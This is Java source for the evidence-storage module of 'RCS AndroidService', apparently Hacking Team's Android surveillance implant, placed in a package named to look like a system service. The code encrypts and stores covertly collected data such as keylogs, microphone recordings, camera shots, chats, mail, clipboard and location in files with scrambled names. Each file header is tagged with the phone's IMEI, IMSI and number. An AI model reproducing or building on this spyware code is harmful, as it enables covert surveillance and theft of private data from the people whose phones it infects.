/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Evidence.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.evidence;

import java.util.Date;
import java.util.Vector;

import com.android.service.Device;
import com.android.service.LogR;
import com.android.service.auto.Cfg;
import com.android.service.conf.Configuration;
import com.android.service.crypto.Encryption;
import com.android.service.crypto.Keys;
import com.android.service.file.AutoFile;
import com.android.service.file.Path;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

/**
 * The Class Evidence (formerly known as Log.)
 */
public final class Evidence {

	/** The Constant EVIDENCE_VERSION_01. */
	private static final int EVIDENCE_VERSION_01 = 2008121901;

	/** The EVIDENCE delimiter. */
	public static int EVIDENCE_DELIMITER = 0xABADC0DE;

	/** The Constant TYPE_EVIDENCE. */
	private static final EvidenceType[] TYPE_EVIDENCE = new EvidenceType[] {
			EvidenceType.INFO,
			EvidenceType.MAIL_RAW,
			EvidenceType.ADDRESSBOOK,
			EvidenceType.CALLLIST, // 0..3
			EvidenceType.DEVICE,
			EvidenceType.LOCATION,
			EvidenceType.CALL,
			EvidenceType.CALL_MOBILE, // 4..7
			EvidenceType.KEYLOG, EvidenceType.SNAPSHOT,
			EvidenceType.URL,
			EvidenceType.CHAT, // 8..b
			EvidenceType.MAIL, EvidenceType.MIC, EvidenceType.CAMSHOT,
			EvidenceType.CLIPBOARD, // c..f
			EvidenceType.NONE, EvidenceType.APPLICATION, // 10..11
			EvidenceType.NONE // 12
	};

	/** The Constant MEMO_TYPE_EVIDENCE. */
	public static final String[] MEMO_TYPE_EVIDENCE = new String[] { "INF",
			"MAR", "ADD", "CLL", // 0..3
			"DEV", "LOC", "CAL", "CLM", // 4..7
			"KEY", "SNP", "URL", "CHA", // 8..b
			"MAI", "MIC", "CAM", "CLI", // c..f
			"NON", "APP", // 10..11
			"NON" // 12

	};

	/** The Constant TAG. */
	private static final String TAG = "Evidence";
	/** The first space. */
	boolean firstSpace = true;

	/** The enough space. */
	boolean enoughSpace = true;

	/** The timestamp. */
	Date timestamp;

	/** The log name. */
	String logName;

	/** The evidence type. */
	int evidenceType;

	/** The file name. */
	String fileName;

	/** The fconn. */
	AutoFile fconn = null;

	// DataOutputStream os = null;
	/** The encryption. */
	Encryption encryption;

	/** The evidence collector. */
	EvidenceCollector evidenceCollector;

	/** The evidence description. */
	EvidenceDescription evidenceDescription;

	/** The device. */
	Device device;

	/** The type evidence id. */
	EvidenceType typeEvidenceId;

	/** The progressive. */
	int progressive;

	/** The aes key. */
	private byte[] aesKey;

	/** The enc data. */
	private byte[] encData;

	/**
	 * Instantiates a new evidence.
	 */
	private Evidence() {
		evidenceCollector = EvidenceCollector.self();
		device = Device.self();

		progressive = -1;
		// timestamp = new Date();
	}

	/**
	 * Instantiates a new log.
	 * 
	 * @param typeEvidenceId
	 *            the type evidence id
	 * @param aesKey
	 *            the aes key
	 */
	public Evidence(final EvidenceType typeEvidenceId, final byte[] aesKey) {
		this();
		if(Cfg.DEBUG) Check.requires(aesKey != null, "aesKey null");
		// agent = agent_;
		this.typeEvidenceId = typeEvidenceId;
		this.aesKey = aesKey;

		encryption = new Encryption(aesKey);
		// if(Cfg.DEBUG) Check.ensures(agent != null, "createLog: agent null");
		if(Cfg.DEBUG) Check.ensures(encryption != null, "encryption null");
	}

	/**
	 * Instantiates a new evidence.
	 * 
	 * @param typeEvidenceId
	 *            the type evidence id
	 */
	public Evidence(final EvidenceType typeEvidenceId) {
		this(typeEvidenceId, Keys.self().getAesKey());
	}

	/**
	 * Enough space.
	 * 
	 * @return true, if successful
	 */
	private boolean enoughSpace() {
		long free = 0;

		free = Path.freeSpace();

		if (free < Configuration.MIN_AVAILABLE_SIZE) {
			if (firstSpace) {
				firstSpace = false;

				if(Cfg.DEBUG) Check.log( TAG + " FATAL: not enough space. Free : " + free);
			}
			return false;
		} else {
			return true;
		}
	}

	/**
	 * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
	 * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
	 * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va
	 * chiamata per i markup perche' la WriteMarkup() e la ReadMarkup() chiudono
	 * automaticamente l'handle.
	 * 
	 * @return true, if successful
	 */
	public synchronized boolean close() {
		boolean ret = false;
		if(fconn!=null && fconn.exists()){
			fconn.dropExtension(EvidenceCollector.LOG_TMP);
			ret = true;
		}

		encData = null;
		fconn = null;
		return ret;
	}

	/**
	 * Crea un'evidenza con tipo standard.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @return true, if successful
	 */
	public synchronized boolean createEvidence(final byte[] additionalData) {
		return createEvidence(additionalData, typeEvidenceId);
	}

	/**
	 * Questa funzione crea un file di log e lascia l'handle aperto. Il file
	 * viene creato con un nome casuale, la chiamata scrive l'header nel file e
	 * poi i dati addizionali se ce ne sono. LogType e' il tipo di log che
	 * stiamo scrivendo, pAdditionalData e' un puntatore agli eventuali
	 * additional data e uAdditionalLen e la lunghezza dei dati addizionali da
	 * scrivere nell'header. Il parametro facoltativo bStoreToMMC se settato a
	 * TRUE fa in modo che il log venga salvato nella prima MMC disponibile, se
	 * non c'e' la chiama fallisce. La funzione torna TRUE se va a buon fine,
	 * FALSE altrimenti.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param evidenceType
	 *            the log type
	 * @return true, if successful
	 */
	public synchronized boolean createEvidence(final byte[] additionalData,
			final EvidenceType evidenceType) {

		this.typeEvidenceId = evidenceType;
		if(Cfg.DEBUG) Check.requires(fconn == null, "createLog: not previously closed");
		timestamp = new Date();

		int additionalLen = 0;

		if (additionalData != null) {
			additionalLen = additionalData.length;
		}

		enoughSpace = enoughSpace();
		if (!enoughSpace) {
			if(Cfg.DEBUG) Check.log( TAG + " createEvidence, no space");
			return false;
		}

		final Name name = evidenceCollector.makeNewName(this,
				evidenceType.getMemo());

		progressive = name.progressive;

		final String dir = name.basePath + name.blockDir + "/";
		final boolean ret = Path.createDirectory(dir);

		if (!ret) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: Dir not created: " + dir);
			return false;
		}

		fileName = dir + name.encName + EvidenceCollector.LOG_TMP;
		if(Cfg.DEBUG) Check.asserts(fileName != null, "null fileName");
		//if(Cfg.DEBUG) Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
		//		"file not scrambled");
		// if(Cfg.DEBUG) Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
		try {
			fconn = new AutoFile(fileName);

			if (fconn.exists()) {
				close();
				if(Cfg.DEBUG) Check.log( TAG + " FATAL: It should not exist:" + fileName);
				return false;
			}
			if(Cfg.DEBUG) Check.log( TAG + " Created " + evidenceType + " : "
					+ name.fileName);
			final byte[] plainBuffer = makeDescription(additionalData,
					evidenceType);
			if(Cfg.DEBUG) Check.asserts(plainBuffer.length >= 32 + additionalLen,
					"Short plainBuffer");

			final byte[] encBuffer = encryption.encryptData(plainBuffer);
			if(Cfg.DEBUG) Check.asserts(encBuffer.length == encryption
					.getNextMultiple(plainBuffer.length), "Wrong encBuffer");
			// scriviamo la dimensione dell'header paddato
			fconn.write(Utils.intToByteArray(plainBuffer.length));
			// scrittura dell'header cifrato
			fconn.append(encBuffer);
			if(Cfg.DEBUG) Check.asserts(fconn.getSize() == encBuffer.length + 4,
					"Wrong filesize");
			// if(AutoConfig.DEBUG) Check.log( TAG + " additionalData.length: " +
			// plainBuffer.length);
			// if(AutoConfig.DEBUG) Check.log( TAG + " encBuffer.length: " + encBuffer.length);
		} catch (final Exception ex) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: file: " + name.fileName + " ex:" + ex);
			return false;
		}

		return true;
	}

	// pubblico solo per fare i test
	/**
	 * Make description.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param evidenceType
	 *            the log type
	 * @return the byte[]
	 */
	public byte[] makeDescription(final byte[] additionalData,
			final EvidenceType evidenceType) {

		if (timestamp == null) {
			timestamp = new Date();
		}

		int additionalLen = 0;

		if (additionalData != null) {
			additionalLen = additionalData.length;
		}

		final DateTime datetime = new DateTime(timestamp);

		evidenceDescription = new EvidenceDescription();
		evidenceDescription.version = EVIDENCE_VERSION_01;
		evidenceDescription.logType = evidenceType;
		evidenceDescription.hTimeStamp = datetime.hiDateTime();
		evidenceDescription.lTimeStamp = datetime.lowDateTime();
		evidenceDescription.additionalData = additionalLen;
		evidenceDescription.deviceIdLen = WChar.getBytes(device.getImei()).length;
		evidenceDescription.userIdLen = WChar.getBytes(device.getImsi()).length;
		evidenceDescription.sourceIdLen = WChar.getBytes(device
				.getPhoneNumber()).length;

		final byte[] baseHeader = evidenceDescription.getBytes();
		if(Cfg.DEBUG) Check.asserts(baseHeader.length == evidenceDescription.length,
				"Wrong log len");
		final int headerLen = baseHeader.length
				+ evidenceDescription.additionalData
				+ evidenceDescription.deviceIdLen
				+ evidenceDescription.userIdLen
				+ evidenceDescription.sourceIdLen;
		final byte[] plainBuffer = new byte[encryption
				.getNextMultiple(headerLen)];

		final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
				plainBuffer.length);
		databuffer.write(baseHeader);
		databuffer.write(WChar.getBytes(device.getImei()));
		databuffer.write(WChar.getBytes(device.getImsi()));
		databuffer.write(WChar.getBytes(device.getPhoneNumber()));

		if (additionalLen > 0) {
			databuffer.write(additionalData);
		}

		return plainBuffer;
	}



	/**
	 * Write evidence.
	 * 
	 * @param data
	 *            the data
	 * @return true, if successful
	 */
	public boolean writeEvidence(final byte[] data) {
		return writeEvidence(data, 0);
	}

	/**
	 * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
	 * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
	 * fine, FALSE altrimenti.
	 * 
	 * @param data
	 *            the data
	 * @param offset
	 *            the offset
	 * @return true, if successful
	 */
	public synchronized boolean writeEvidence(final byte[] data,
			final int offset) {

		if(!enoughSpace){
			return false;
		}
		
		encData = encryption.encryptData(data, offset);

		if (fconn == null) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: fconn null");
			return false;
		}

		try {
			fconn.append(Utils.intToByteArray(data.length - offset));
			fconn.append(encData);
			fconn.flush();
		} catch (final Exception e) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: Error writing file: " + e);
			return false;
		}

		return true;
	}

	/**
	 * Write logs.
	 * 
	 * @param bytelist
	 *            the bytelist
	 * @return true, if successful
	 */
	public boolean writeEvidences(final Vector bytelist) {

		int totalLen = 0;
		for (int i = 0; i < bytelist.size(); i++) {
			final byte[] token = (byte[]) bytelist.elementAt(i);
			totalLen += token.length;
		}

		final int offset = 0;
		final byte[] buffer = new byte[totalLen];
		final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen);

		for (int i = 0; i < bytelist.size(); i++) {
			final byte[] token = (byte[]) bytelist.elementAt(i);
			databuffer.write(token);
		}
		return writeEvidence(buffer);
	}

	/**
	 * Gets the enc data.
	 * 
	 * @return the enc data
	 */
	public byte[] getEncData() {
		return encData;
	}

	/**
	 * Info.
	 * 
	 * @param message
	 *            the message
	 */
	public static void info(final String message) {
		try {
			// atomic info
			new LogR(EvidenceType.INFO, LogR.LOG_PRI_STD, null, WChar.getBytes(
					message, true));

		} catch (final Exception ex) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: " + ex.toString());
		}
	}

	/**
	 * Atomic write once.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param logType
	 *            the log type
	 * @param content
	 *            the content
	 */
	public void atomicWriteOnce(final byte[] additionalData,
			final EvidenceType logType, final byte[] content) {
		if (createEvidence(additionalData, logType)) {
			writeEvidence(content);
			if(Cfg.DEBUG) Check.ensures(getEncData().length % 16 == 0, "wrong len");
			close();
		}
	}
}
